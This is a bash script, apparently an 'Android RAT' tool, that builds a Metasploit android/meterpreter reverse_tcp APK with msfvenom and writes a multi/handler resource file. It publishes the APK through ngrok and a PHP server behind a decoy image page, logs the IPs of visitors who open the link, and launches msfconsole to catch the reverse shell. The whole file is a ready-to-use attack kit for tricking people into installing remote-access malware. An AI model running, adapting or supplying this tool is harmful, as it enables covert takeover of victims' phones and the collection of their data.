#!/bin/bash
cd .file
rm -rf ip_clicked.txt
bash .1.sh
clear
echo " " 
echo "┌───── •✧✧• ─────┐
 Made By Hack3rDj
└───── •✧✧• ─────┘
                          ╱▔▔▔▔╲
                         ┃ ▇  ▇ ┃
                       ╭╮┣━━━━━━┫╭╮
                       ┃┃┃┈┈🤖┈┈┃┃┃
                       ╰╯┃┈┈┈┈┈┈┃╰╯
                         ╰┓┏━━┓┏╯
                          ╰╯  ╰╯ " | lolcat	 && echo " 
         ░█████╗░███╗░░██╗██████╗░██████╗░░█████╗░
         ██╔══██╗████╗░██║██╔══██╗██╔══██╗██╔══██╗
         ███████║██╔██╗██║██║░░██║██████╔╝██║░░██║
         ██╔══██║██║╚████║██║░░██║██╔══██╗██║░░██║
         ██║░░██║██║░╚███║██████╔╝██║░░██║╚█████╔╝
         ╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝░╚════╝░" | lolcat && echo " 
                ██████╗░░█████╗░████████╗
                ██╔══██╗██╔══██╗╚══██╔══╝
                ██████╔╝███████║░░░██║░░░
                ██╔══██╗██╔══██║░░░██║░░░
                ██║░░██║██║░░██║░░░██║░░░
                ╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░" | lolcat
tput setaf 1; echo " "
read -p 'SET LHOST❯❯ ' lhost
tput setaf 2; echo " "
read -p 'SET LPORT❯❯ ' lport
tput setaf 3; echo " "
read -p 'SET APP NNAME❯❯ ' apn
echo "#!/usr/bin/bash" > .1.sh
echo "rm -rf "$apn".apk" >> .1.sh
tput setaf 5; echo " "
read -p 'SET  PHOTO PATH❯❯ ' photo
tput setaf 6; echo " "
read -p 'SET LISTNER LPORT❯❯ ' port
cp "$photo" image.jpeg
echo "use exploit/multi/handler" > .d.rc
echo "set payload android/meterpreter/reverse_tcp" >> .d.rc
echo "set lhost $lhost" >> .d.rc
echo "set lport $port" >> .d.rc
echo "exploit" >> .d.rc
echo " "
tput setaf 2; echo " PLEASE WAIT YOUR PAYLOAD IS CREATING"
msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$apn.apk" && tput setaf 2; echo "SUCESSFULLY GENERATED! "
echo " "
chmod -R 755 *
printf "\e[1;92m[\e[0m-+\e[1;92m] Checking for Ngrok Executable...\n"
sleep 3
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;31m[\e[0m\e[1;37m-X\e[0m\e[1;31m]\e[0m\e[1;92m Ngrok not found in the directory...\e[0m\e[1;93m %s \n"
printf "\e[1;92m[\e[0mOk\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -q --show-progress
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"/$apn.apk
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip -q --show-progress
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok 
chmod +x ngrok-stable-linux-386.zip
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
killall -2 ngrok > /dev/null 2>&1
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
killall -2 ssh > /dev/null 2>&1
fuser -k 4441/tcp > /dev/null 2>&1
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S localhost:4441 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 4441 > /dev/null 2>&1 &
sleep 10
echo -e "[\e[0mOk\e[1;92m] Please wait..."
sleep 2
echo -e "[\e[0mOk\e[1;92m] Forwarded port:👉 \e[0m\e[1;93m 4441"
echo " "
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;31m[\e[0m\e[1;37mOk\e[0m\e[1;31m]\e[0m\e[1;92m Here is your Link :👉 \e[0m\e[1;93m %s \n" $ngrok_link
echo " "
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> ip_clicked.txt
rm -rf ip.txt
}
sleep 5
echo "<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
.responsive {
  width: 100%;
  height: auto;
}
</style>
</head>
<body>
<a href="$apn.apk"><img src="image.jpeg" alt="Nature" class="responsive" width="600" height="400"></a>

</body>
</html>
" > index.html
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip  && cat ip_clicked.txt && msfconsole -r .d.rc
fi
done
